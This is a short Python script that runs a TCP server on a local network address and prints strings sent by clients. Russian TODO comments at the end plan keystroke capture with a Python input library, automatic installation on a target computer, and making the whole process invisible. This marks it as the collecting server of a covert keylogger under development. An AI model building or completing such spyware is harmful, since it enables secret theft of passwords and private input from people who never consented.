import socketserver
import os

class FileServer(socketserver.BaseRequestHandler):
    def handle(self):
        recieved_string = self.request.recv(1024).decode('utf-8')
        print(f'receiving string: {recieved_string}')

if __name__ == '__main__':
    HOST, PORT = '192.168.84.235', 1289
    with socketserver.TCPServer((HOST, PORT), FileServer) as server:
        print('Server started, waiting for connections')
        server.serve_forever()


# 1. переписать захват клавиш на pyinput
# 2. Автоматизировать весь процесс установки на комп
# 3. Сделать весь процесс работы незаметным